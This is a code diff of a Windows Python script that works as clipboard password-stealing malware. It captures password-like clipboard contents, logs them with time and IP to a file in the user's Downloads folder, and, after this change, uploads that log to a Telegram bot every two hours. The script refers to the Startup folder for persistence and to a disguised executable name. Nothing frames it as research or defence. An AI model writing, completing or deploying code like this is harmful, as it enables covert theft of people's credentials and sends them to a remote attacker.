@@ -3,24 +3,29 @@ from ctypes import windll
 import getpass as gp
 import http.client
 import sys
-import time
+from time import sleep
 from datetime import datetime
 import pyperclip
 import regex as re
 import requests
 import glob
+import time
 
 MY_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 # telegram token and id
-TOKEN = 'some_token'
-ADMIN_ID = 'some_id'
+TOKEN = r'some_token'
+ADMIN_ID = r'some_id'
 USER_NAME = gp.getuser()
 DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/get_pass_to_comp.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
                f'Windows/Start Menu/Programs/Startup/'
-
+LOG_PATH = f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt'
 # temporally variable for clipboard
 CLIPBOARD_STRING = ''
+# interval to send a log
+interval = (3600 * 2)
+# time start script
+start_time = time.time()
 
 
 # Check startup
@@ -79,32 +84,42 @@ def ip_finder():
         return 'Can not find ip'
 
 
+# Intercept pass,  write to file and send text log to Telegram
 def start_loop():
     # string for intercept pass
     pass_string = ''
-    global CLIPBOARD_STRING
+    global CLIPBOARD_STRING, start_time
     # variable for ip
     ip = ip_finder()
     while True:
-        # create / open file for save passwords:
-        f = open('intercepted_passwords.txt', 'a')
         # assign string to clipboard:
         CLIPBOARD_STRING = pyperclip.paste()
+        # create / open file for save passwords:
+        f = open('intercepted_passwords.txt', 'a')
         # check password in list and check is link or not:
         for _ in interceptor_passwords(CLIPBOARD_STRING):
             if CLIPBOARD_STRING != pass_string and 'http' not in CLIPBOARD_STRING:
+                # validate pass
                 caught_pass = interceptor_passwords(CLIPBOARD_STRING)
-                # format message to telegram
-                message = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id=' \
-                          f'{ADMIN_ID}&text={f"Password: {caught_pass} used {MY_TIME} IP: {ip}"}'
                 if caught_pass is not None:
                     # add intercepted pass and used time and ip to doc:
                     print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
                     f.close()
-                    # send message to telegram
-                    requests.get(message)
+                    # send log to telegram
+                    global start_time
+                    while True:
+                        if int(time.time() - start_time) >= interval:
+                            files = {
+                                'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
+                            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
+                                          files=files)
+                            # reset start time
+                            start_time = time.time()
+                        else:
+                            continue
+            # reassign clipboard to string
             pass_string = CLIPBOARD_STRING
-        time.sleep(1)
+        sleep(1)
 
 
 if __name__ == '__main__':
@@ -112,5 +127,4 @@ if __name__ == '__main__':
     check_admin()
     create_bat()
     clipboard_cleaner()
-    interceptor_passwords(CLIPBOARD_STRING)
     start_loop()
